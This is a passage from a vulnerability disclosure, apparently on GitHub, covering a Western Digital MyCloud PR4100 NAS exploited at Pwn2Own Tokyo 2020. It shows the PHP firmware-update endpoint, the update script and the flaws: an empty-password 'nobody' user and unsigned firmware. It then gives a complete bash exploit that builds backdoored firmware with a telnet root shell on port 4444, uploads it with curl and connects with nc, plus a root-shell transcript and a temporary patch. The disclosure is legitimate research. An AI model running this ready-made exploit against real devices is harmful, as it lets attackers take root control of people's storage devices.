     * \par Security:
     * - Requires user authentication (LAN/WAN)
     *
     * \par HTTP Method: POST
     * - http://localhost/api/@REST_API_VERSION/rest/firmware_update
     *
     * \par HTTP POST Body
     * - filepath=/CacheVolume/filename
     *
     * \param filepath  String - optional
     * \param format    String - optional
     *
     * \par Parameter Details:
     * - filepath:   If filepath is not specified, file is assumed to be streamed as part of the http POST.
     *
     * \retval status String - success
     *
     * \par HTTP Response Codes:
     * - 200 - On successful updation of the firmware
     * - 400 - Bad request, if parameter or request does not correspond to the api definition
     * - 401 - User is not authorized
     * - 403 - Request is forbidden
     * - 404 - Requested resource not found
     * - 500 - Internal server error
     *
     * \par Error Codes:
     * - 177 - FIRMWARE_UPDATE_BAD_REQUEST - Firmware update bad request
     * - 178 - FIRMWARE_UPDATE_INTERNAL_SERVER_ERROR - Firmware update internal server error
     *
     * \par XML Response Example:
     * \verbatim
      <firmware_update>
      <status>success</status>
      </firmware_update>
      \endverbatim
     */
    public function post($urlPath, $queryParams = null, $outputFormat = 'xml') {

        if (!isset($queryParams['filepath']) && isset($_FILES['file']['tmp_name'])) {
            $queryParams["filepath"] = "/CacheVolume/" . $_FILES['file']['name'];
            move_uploaded_file($_FILES['file']['tmp_name'], $queryParams['filepath']);
        }

        $fwUpdateObj = new Model\Firmware();
        $result = $fwUpdateObj->manualFWUpdate($queryParams);

        switch ($result) {
            case 'SUCCESS':
                $results = array('status' => 'success');
                $this->generateSuccessOutput(200, 'firmware_update', $results, $outputFormat);
                break;
            case 'BAD_REQUEST':
                throw new \Core\Rest\Exception('FIRMWARE_UPDATE_BAD_REQUEST', 400, NULL, self::COMPONENT_NAME);
            case 'SERVER_ERROR':
                throw new \Core\Rest\Exception('FIRMWARE_UPDATE_INTERNAL_SERVER_ERROR', 400, NULL, self::COMPONENT_NAME);
        }
    }
```
> Snippet 1: *Update.php::post()* firmware\_update POST REST API endpoint

We can see that it accepts a multipart file upload and then moves it to */CacheVolume*. At the time we thought this would allow us to write to an arbitrary directory using path traversal, but it seems that PHP sanitises the upload filename in the *$\_FILES* array, so this was not possible.

The filename is then passed to *manualFWUpdate()*, which is shown below:

```
    public function manualFWUpdate($changes) {

        if (!isset($changes['filepath'])) {
            return 'BAD_REQUEST';
        }

        $output=$retVal=null;
		$escFirmwareArg = escapeshellarg($changes["filepath"]);
        exec_runtime("sudo nohup /usr/local/sbin/updateFirmwareFromFile.sh $escFirmwareArg 1>/dev/null 2>&1 &", $output, $retVal, false);

        return 'SUCCESS';
    }
```
> Snippet 2: *Firmware.php::manualFWUpdate()*

In this snippet, the *filepath* shell argument is escaped, which avoids command injection, but then it is passed to */usr/local/sbin/updateFirmwareFromFile.sh*, which is shown below:

```
#!/bin/sh
#
# Modified by Alpha_Hwalock, for LT4A
#
# updateFirmwareFromFile.sh <filename> [check_filesize]"
#
# <return>	 1:	shell script check failure
#			 0: success
#			-1: upload_firmware return fail

PATH=/sbin:/bin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin

. /etc/nas/alert-param.sh

filename=${1}
check_size=${2:-""}
upFwPathPrefix="/usr/local/upload/"

# check params
if [ $# -lt 1 ]; then
    echo "usage: updateFirmwareFromFile.sh <filename> [check_filesize]"
    exit 1
fi
if [ ! -f ${filename} ]; then
    echo "File not found"
    exit 1
fi

# hwalock: check file size
if [ "${check_size}" != "" ]; then
    FileSize=`cat /tmp/fw_upgrade_filesize`
    blocksize_ls=`ls -l ${filename} | awk '{print $5}'`
    if [ "${FileSize}" != "${blocksize_ls}" ]; then
        echo "failed 202 \"failed download file size check\"" | tee /tmp/fw_update_status
		exit 1
    fi
fi

upload_firmware -c auto
cp -f ${filename} /usr/local/upload/newFirmware

touch /tmp/upload_fw
upload_firmware -n newFirmware
status=$?

do_reboot &
#alert_test -a ${rebootRequired} -f&

exit ${status}
```
> Snippet 3: */usr/local/sbin/updateFirmwareFromFile.sh*

Here we can see that the firmware file we have uploaded is copied to */usr/local/upload/newFirmware* and then *upload\_firmware* is invoked.

*upload\_firmware* is an executable file that performs integrity checks on the firmware file, and then if all checks are passed, flashes the file to the eMMC memory chip.

In order to access this API with the *nobody* user, we simple have to send the following POST request:

```
POST /api/2.1/rest/firmware_update?auth_username=nobody&auth_password=

< ... multipart file upload ...>

```

Recall that *nobody* has an empty password, hence why it will allow access to this authenticated endpoint.

We believe this is a critical flaw - why is a unprivileged user allowed to upload firmware files and initiate firmware upgrades? This functionality should only be performed by administrative users.

## Vulnerability #3: No Cryptographic Verification of Firmware Upgrades

In order to have secure firmware upgrades, a firmware upgrade file should be signed by device vendor in order for the device to verify its authenticity.
Unfortunately for Western Digital, that is not the case for the PR4100 device.

The final part of the upgrade process is when *upload\_firmware* is invoked. This binary does simple integrity checks such as checksums, verifying magic numbers, etc, but no cryptographic verification of the uploaded firmware.

This means that any firmware upgrade file that is received and passes the integrity checks will be flashed onto the device.

# Exploitation

As shown in the previous sections, we can access the authenticated REST API endpoints with the default user *nobody* and use the *firmware\_update* API endpoint to upload a firmware file to the device. As long as this file passes the integrity checks, it will be flashed onto the device.

To create a valid firmware file we can use the PR4100 GPL code. This code contains tools to build firmware images that are accepted by the device, and saved us a lot of time of reverse engineering on how to build a valid firmware file.

There are multiple ways to achieve code execution since we fully control the firmware file that is flashed onto the device. We chose to replace the UPNP daemon *upnp\_nas\_device*, which is called at every boot, with a shell script that spawns an unauthenticated telnet root shell on port 4444.

The firmware file is then uploaded to the device and after a few minutes of upgrading and rebooting, we can connect to port 4444 on the device and get our root shell:

```
BusyBox v1.20.2 (2019-07-04 10:39:50 CST) built-in shell (ash)
Enter 'help' for a list of built-in commands.

root@MyCloudPR4100 / # id
uid=0(root) gid=0(root)
root@MyCloudPR4100 / # uname -a
Linux MyCloudPR4100 4.1.13 #1 SMP Mon Jun 29 00:11:44 PDT 2020 Build-git249a60f x86_64 GNU/Linux
root@MyCloudPR4100 / #

```

By flashing the stock firmware we can revert our changes and "unbackdoor" the device.

## Full exploit

The full end-to-end exploit is shown below. This exploit builds the backdoored firmware image, uploads it to the device and then connects to the root reverse shell. The exploit takes a minimum of 5 minutes to run, depending on the network and CPU speed of the computer running the exploit. It is recommended to run the exploit in a Kali, Debian or Ubuntu machine that can run 32 bit binaries.

In the Pwn2Own competition, our intention was to use a shortened version that uploaded a pre-built backdoored firmware image instead. This shortened version consists of steps 6 and 7 of the exploit below, and takes a maximum of 3 minutes and 30 seconds to run in order to fit the competition's time limits (5 minutes per attempt).

```
#!/bin/bash

echo "> weekend_destroyer: exploit for Western Digital MyCloud PR4100 for Pwn2Own Tokyo 2020 by"
echo "  Pedro Ribeiro (@pedrib1337 | pedrib@gmail.com)"
echo "  Radek Domanski (@RabbitPro | radek.domanski@gmail.com)"
echo ""

if [ $# -eq 0 ]; then
    echo "> Usage: ./weekend_destroyer.sh <RHOST>"
    exit 1
fi

# replace these vars for new firmware versions, the rest of the code should work as-is
FW_VERSION="2.40.155"
FW_GPL="WDMyCloud_PR4100_GPL_v2.40.155_20200713"

RHOST="$1"
echo "> Attacking $RHOST"

echo "> 1: Downloading GPL code"
wget https://downloads.wdc.com/gpl/$FW_GPL.tar.gz
tar xf $FW_GPL.tar.gz
cd $FW_GPL/

echo "> 2: Modifying firmware version"
cd firmware/module
sed -i "s/$FW_VERSION/2.99.999/g" crfs/default/config.xml

echo "> 3: Creating backdoor in root filesystem"
cd crfs/bin
mv upnp_nas_device upnp_nas_device.old
cat <<'EOF' >> upnp_nas_device
#!/bin/sh
PS=`ps faux | grep utelnetd | grep -v grep`
if [ -z "$PS" ]; then
  utelnetd -d -l /bin/sh -p 4444
fi
EOF
chmod +x upnp_nas_device
cd ../../

echo "> 4: Building root filesystem (requires sudo to install lib32z1)"
sudo apt install lib32z1
./create_image.sh
sleep 0.5
rm ../merge/image.cfs
mv image.cfs ../merge/

echo "> 5: Building firmware image"
cd ../merge && ./merge

echo "> 6: Sending firmware update"
curl -vv -X POST -F 'file=@WD-NAS-firmware' "http://$RHOST/api/2.1/rest/firmware_update?auth_username=nobody&auth_password="

echo ""
echo "> 7: Now sit back and wait for Shelly, she takes around 3 minutes to arrive!"
while true; do
  sleep 1
  nc $RHOST 4444 2>/dev/null
  if [ $? -eq 0 ]; then
    break
  else
    echo -n "."
  fi
done

echo "> Exploit finished"
```

## Patch

We are also publishing a patch to fix this issue (since Western Digital refuses to do so). However, this patch is not permanent and needs to be applied at every reboot.

```
#!/bin/bash

echo "> weekend_destroyer_patch: patch for 0 day sploit by"
echo "  Pedro Ribeiro (@pedrib1337 | pedrib@gmail.com)"
echo "  Radek Domanski (@RabbitPro | radek.domanski@gmail.com)"
echo "v0.1, released 25/02/2021"
echo ""

echo "> Patching vulnerability and restarting httpd..."

# Yup, this is the only POST with USER_AUTH in the whole file, so this is safe
sed -i 's/<post>USER_AUTH<\/post>/<post>ADMIN_AUTH<\/post>/' /var/www/rest-api/api/System/config/module.config.xml
killall httpd
sleep 1
httpd -f /usr/local/apache2/conf/httpd.conf -k graceful &
sleep 1

echo "> Vulnerability patched. Don't forget to run this script at every reboot!"
```

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.youtube.com_faa8bab8_20250108_131521.html ===
[About](https://www.youtube.com/about/)[Press](https://www.youtube.com/about/press/)[Copyright](https://www.youtube.com/about/copyright/)[Contact us](/t/contact_us/)[Creators](https://www.youtube.com/creators/)[Advertise](https://www.youtube.com/ads/)[Developers](https://developers.google.com/youtube)[Terms](/t/terms)[Privacy](/t/privacy)[Policy & Safety](https://www.youtube.com/about/policies/)[How YouTube works](https://www.youtube.com/howyoutubeworks?utm_campaign=ytgen&utm_source=ythp&utm_medium=LeftNav&utm_content=txt&u=https%3A%2F%2Fwww.youtube.com%2Fhowyoutubeworks%3Futm_source%3Dythp%26utm_medium%3DLeftNav%26utm_campaign%3Dytgen)[Test new features](/new)© 2025 Google LLC
